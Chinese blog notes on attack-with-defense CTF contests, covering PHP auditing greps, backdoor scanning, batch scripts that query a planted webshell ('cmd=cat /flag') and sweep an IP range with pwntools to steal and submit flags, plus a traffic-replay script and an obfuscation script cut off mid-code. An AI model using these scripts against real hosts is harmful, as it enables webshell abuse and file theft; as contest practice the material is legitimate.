+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="seay代码审计工具"><a href="#seay代码审计工具" class="headerlink" title="seay代码审计工具"></a>seay代码审计工具</h3><p>先快速找一波，再用D盾扫</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> . -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="keyword">grep</span> -n <span class="string">&#x27;eval(&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">find</span> . -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="keyword">grep</span> -n <span class="string">&#x27;assert(&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">find</span> . -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="keyword">grep</span> -n <span class="string">&#x27;system(&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">find</span> . -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="keyword">grep</span> -n <span class="string">&#x27;shell_exec&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">find</span> . -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="keyword">grep</span> -n <span class="string">&#x27;exec&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">find</span> . -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="keyword">grep</span> -n <span class="string">&#x27;proc_open&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">find</span> . -name <span class="string">&#x27;*.php&#x27;</span> | xargs <span class="keyword">grep</span> -n <span class="string">&#x27;preg_replace&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后可以用D盾扫看有没有后门</p>
+<p>seay白盒审计,可以用全局搜索函数</p>
+<p>审计</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204252311142.png" alt="Snipaste_2021-09-24_11-01-33"></p>
+<p>全局搜索</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204252311133.png" alt="Snipaste_2021-09-24_11-01-19"></p>
+<h3 id="fortity"><a href="#fortity" class="headerlink" title="fortity"></a>fortity</h3><p>具体用法，可以扫描一些其它语言</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52515588/article/details/124320421">https://blog.csdn.net/weixin_52515588/article/details/124320421</a></p>
+<h3 id="D盾扫后门"><a href="#D盾扫后门" class="headerlink" title="D盾扫后门"></a>D盾扫后门</h3><p><a target="_blank" rel="noopener" href="http://www.d99net.net/">http://www.d99net.net/</a></p>
+<p>有些比赛会给你留一个简单的后门，这个时候一般D盾能扫描出来</p>
+<h2 id="批量攻击"><a href="#批量攻击" class="headerlink" title="批量攻击"></a>批量攻击</h2><h3 id="一些批量脚本"><a href="#一些批量脚本" class="headerlink" title="一些批量脚本"></a>一些批量脚本</h3><p>仅供参考，使用前请提前调试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time,re,base64,sys,os,random,itertools,logging,html,json</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="comment"># global var</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">url_flag = <span class="string">&#x27;http://49.234.101.119/submit.php&#x27;</span></span><br><span class="line">url_list = [<span class="string">&#x27;49.234.101.119&#x27;</span>] * <span class="number">10</span></span><br><span class="line">url_list = [<span class="string">&#x27;http://&#123;&#125;/sdnasdhasohdaus.php?cmd=cat /flag&#x27;</span>.<span class="built_in">format</span>(url) <span class="keyword">for</span> url <span class="keyword">in</span> url_list]</span><br><span class="line">round_time = <span class="number">3</span> <span class="comment"># minutes</span></span><br><span class="line">success_string = <span class="string">b&#x27;success&#x27;</span></span><br><span class="line">single = <span class="literal">False</span> <span class="comment"># 控制单线程还是多线程</span></span><br><span class="line">options = [] </span><br><span class="line">args = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display</span>(<span class="params">info</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>,info,<span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tell_me_time</span>():</span><br><span class="line">	<span class="keyword">return</span> time.strftime(<span class="string">&#x27;%H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># function about time to sleep</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleep_minute</span>(<span class="params">minute</span>):</span><br><span class="line">	time.sleep(minute*<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleep_second</span>(<span class="params">second</span>):</span><br><span class="line">	time.sleep(second)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_info</span>(<span class="params">message</span>):</span><br><span class="line">    logging.basicConfig(level=<span class="string">&#x27;INFO&#x27;</span>,</span><br><span class="line">                        filename=<span class="string">&#x27;flag.log&#x27;</span>,</span><br><span class="line">                        filemode=<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    logging.info(message)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_option</span>():</span><br><span class="line">	<span class="keyword">global</span> options,args</span><br><span class="line">	parser = OptionParser(usage=<span class="string">&#x27;Usage: python %prog [options] type&#x27;</span>)</span><br><span class="line">	parser.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--url&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,dest=<span class="string">&#x27;url&#x27;</span>,default=<span class="string">&#x27;http://127.0.0.1&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target ip&#x27;</span>)</span><br><span class="line">	parser.add_option(<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;--url_list&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,dest=<span class="string">&#x27;url_list&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target ip list&#x27;</span>)</span><br><span class="line">	parser.add_option(<span class="string">&#x27;-t&#x27;</span>,<span class="string">&#x27;--timeout&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>,dest=<span class="string">&#x27;timeout&#x27;</span>,default=<span class="number">2</span>,<span class="built_in">help</span>=<span class="string">&#x27;timeout&#x27;</span>)</span><br><span class="line">	parser.add_option(<span class="string">&#x27;-n&#x27;</span>,<span class="string">&#x27;--threadnum&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>,dest=<span class="string">&#x27;threadnum&#x27;</span>,default=<span class="number">10</span>,<span class="built_in">help</span>=<span class="string">&#x27;threadnum&#x27;</span>)</span><br><span class="line">	parser.add_option(<span class="string">&#x27;-p&#x27;</span>,<span class="string">&#x27;--type&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,dest=<span class="string">&#x27;request_type&#x27;</span>,default=<span class="string">&#x27;post&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;request type&#x27;</span>)</span><br><span class="line">	parser.add_option(<span class="string">&#x27;-r&#x27;</span>,<span class="string">&#x27;--round&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>,dest=<span class="string">&#x27;round&#x27;</span>,default=<span class="number">10</span>,<span class="built_in">help</span>=<span class="string">&#x27;total round&#x27;</span>)</span><br><span class="line">	parser.add_option(<span class="string">&#x27;-d&#x27;</span>,<span class="string">&#x27;--debug&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>,dest=<span class="string">&#x27;debug&#x27;</span>,default=<span class="number">0</span>,<span class="built_in">help</span>=<span class="string">&#x27;debug mode&#x27;</span>)</span><br><span class="line">	parser.add_option(<span class="string">&#x27;-m&#x27;</span>,<span class="string">&#x27;--max_try_time&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>,dest=<span class="string">&#x27;max_try_time&#x27;</span>,default=<span class="number">1</span>,<span class="built_in">help</span>=<span class="string">&#x27;max retry time&#x27;</span>)</span><br><span class="line">	(options, args) = parser.parse_args(sys.argv)</span><br><span class="line">	parser.print_help()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;whoami&#x27;</span>&#125;</span><br><span class="line">    cookies = &#123;&#125;</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    r = requests.get(url=url,data=data,cookies=cookies,headers=headers)</span><br><span class="line">    result = re.findall(<span class="string">&quot;(flag&#123;.*?&#125;)&quot;</span>,r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">flag</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;flag&#x27;</span>:flag&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&#x27;session&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url=url_flag,cookies=cookies)</span><br><span class="line">    <span class="keyword">return</span> success_string <span class="keyword">in</span> r.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">url</span>):</span><br><span class="line">    flag = exploit(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; [FLAG=&#123;&#125;] ip &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(tell_me_time(),flag,url))</span><br><span class="line">    status = submit(flag)</span><br><span class="line">    <span class="keyword">if</span> status:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; [OK] ip &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(tell_me_time(),url))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; [FAILED] ip &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(tell_me_time(),url))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># set_option() 暂时不需要</span></span><br><span class="line">    cnt = <span class="number">1</span></span><br><span class="line">    display(<span class="string">&quot;[URL LIST]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(url_list))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;=&#x27;</span>*<span class="number">40</span>,<span class="string">&#x27;[ROUND &#123;&#125;]&#x27;</span>.<span class="built_in">format</span>(cnt),<span class="string">&#x27;=&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> single == <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># single</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[single] ...........&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">                task(url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># multi_threading</span></span><br><span class="line">            thread_list = []</span><br><span class="line">            p = ThreadPoolExecutor(<span class="built_in">len</span>(url_list))</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">                obj = p.submit(task,url)</span><br><span class="line">                thread_list.append(obj)</span><br><span class="line">            p.shutdown()</span><br><span class="line">        <span class="comment"># sleep_minute(round_time) # 建议不用休眠太长</span></span><br><span class="line">        sleep_second(<span class="number">20</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;192-168-1-&#x27;+str(103)+&#x27;.awd.bugku.cn&#x27;,9999)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#a=[228]</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#for i in a:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subflag</span>(<span class="params">flag</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;a=&quot;./flag&quot;&#x27;</span>)</span><br><span class="line">    	io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;read(a)&#x27;</span>)</span><br><span class="line">	a=io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(a)</span><br><span class="line">	flag = re.findall(<span class="string">r&#x27;[0-9A-Za-z]&#123;60&#125;&#x27;</span>,a)</span><br><span class="line">	<span class="built_in">print</span>(flag)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		flag = flag[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">		url = <span class="string">&#x27;http://192.168.1.200/api/v1/att_def/web/submit_flag/?event_id=10&#x27;</span></span><br><span class="line">		data = &#123;<span class="string">&quot;flag&quot;</span>:flag,<span class="string">&quot;token&quot;</span>:<span class="string">&quot;FBWQwm84r3muFs49JHcf6YxeUaARHXDK75ntt9QWGxhQY&quot;</span>&#125;</span><br><span class="line">		<span class="comment"># print(ip)</span></span><br><span class="line">		<span class="built_in">print</span>(flag)</span><br><span class="line">		res = requests.post(url=url,data=data,timeout=<span class="number">2</span>)</span><br><span class="line">		<span class="built_in">print</span>(res.text)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">23</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;172.35.&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.15&#x27;</span>,<span class="number">9999</span>)        </span><br><span class="line">	subflag(flag)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="burp的tips"><a href="#burp的tips" class="headerlink" title="burp的tips"></a>burp的tips</h3><p>burp的host爆破和request插件</p>
+<h2 id="流量重放"><a href="#流量重放" class="headerlink" title="流量重放"></a>流量重放</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">	<span class="built_in">print</span> (<span class="string">&quot;Usage: python repost.py [log_dir] [regex]&quot;</span>)</span><br><span class="line">	exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> = os.listdir(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">	file = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>] + <span class="string">&#x27;/&#x27;</span> + i)</span><br><span class="line">	content = file.read()</span><br><span class="line"></span><br><span class="line">	host = re.findall(<span class="string">&quot;Host: (.*)\n&quot;</span>, content)[<span class="number">0</span>].strip()</span><br><span class="line">	<span class="keyword">if</span> host.find(<span class="string">&quot;:&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">	    port = host.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">	    host = host.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">	    port = <span class="string">&quot;80&quot;</span></span><br><span class="line"></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	sock.connect((host, <span class="built_in">int</span>(port)))</span><br><span class="line">	sock.sendall(content)</span><br><span class="line">	reply = sock.recv(<span class="number">4096</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(re.findall(sys.argv[<span class="number">2</span>], reply)):</span><br><span class="line">		<span class="built_in">print</span> content <span class="comment"># send</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;finish&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是抓取别的队伍的exp或者check的流量直接改目标重放来进行攻击</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Jeffz615/autoTcpReplay">https://github.com/Jeffz615/autoTcpReplay</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/267902">https://cloud.tencent.com/developer/news/267902</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wupco/weblogger">https://github.com/wupco/weblogger</a></p>
+<h2 id="流量混淆"><a href="#流量混淆" class="headerlink" title="流量混淆"></a>流量混淆</h2><p>由于攻击代码可能会被别人进行流量的分析，从而自己找到的漏洞就被别人轻易获取，这个时候流量混淆就变得非常重要了。</p>
+<p>所以拿到代码测试flag一般打NPC，或者自己的靶机，而不是直接不加密去拿别人的flag,这样有被重放的风险</p>
+<p><strong>一些混淆的链接</strong></p>
+<p><a target="_blank" rel="noopener" href="https://flag0.com/2018/09/15/AWD%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86/">https://flag0.com/2018/09/15/AWD%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86/</a></p>
+<p><strong>简单的干扰脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成ip列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip_list</span>():</span><br><span class="line">    <span class="keyword">global</span> iplist</span><br><span class="line">    iplist = []</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        i = <span class="string">&quot;182.92.91.240&quot;</span>  <span class="comment">#根据实际情况改</span></span><br><span class="line">        <span class="comment">#i = &quot;172.16.206.&quot;+str(a)</span></span><br><span class="line">        iplist.append(i)</span><br><span class="line"><span class="comment">#获取目录名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_catalog</span>():</span><br><span class="line">	<span class="keyword">with</span> io.<span class="built_in">open</span>(<span class="string">&#x27;catalog.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		catalog = f.read().split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> catalog</span><br><span class="line"><span class="comment">#获取文件名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_doc</span>():</span><br><span class="line">	<span class="keyword">with</span> io.<span class="built_in">open</span>(<span class="string">&#x27;doc.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		doc = f.read().strip().split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> doc</span><br><span class="line"><span class="comment">#获取请求内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_cmd</span>():</span><br><span class="line">	<span class="keyword">with</span> io.<span class="built_in">open</span>(<span class="string">&#x27;cmd.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		cmds = f.readlines()</span><br><span class="line">	cmds = [cmd.strip() <span class="keyword">for</span> cmd <span class="keyword">in</span> cmds]</span><br><span class="line">	<span class="keyword">return</span> 	cmds</span><br><span class="line"><span class="comment">#获取cookie</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_cookie</span>():</span><br><span class="line">	<span class="keyword">with</span> io.<span class="built_in">open</span>(<span class="string">&#x27;useragent.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		user_agents = f.readlines()</span><br><span class="line">	user_agents = [base64.b64encode((ua.strip()[<span class="number">21</span>:<span class="number">40</span>]).encode()) <span class="keyword">for</span> ua <span class="keyword">in</span> user_agents]  <span class="comment">#hashlib.md5(b&quot;asdasd&quot;)</span></span><br><span class="line">	<span class="keyword">return</span> user_agents</span><br><span class="line"><span class="comment">#构造url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Build_url</span>(<span class="params">ip,catalog,doc</span>):</span><br><span class="line">	catalog = random.choice(Get_catalog())</span><br><span class="line">	<span class="comment">#print(catalog)</span></span><br><span class="line">	doc = random.choice(Get_doc())</span><br><span class="line">	url = <span class="string">&#x27;http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span> + catalog + <span class="string">&#x27;/&#x27;</span> + doc </span><br><span class="line">	<span class="keyword">return</span> url</span><br><span class="line"><span class="comment">#随机浏览器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">headerbuild</span>(<span 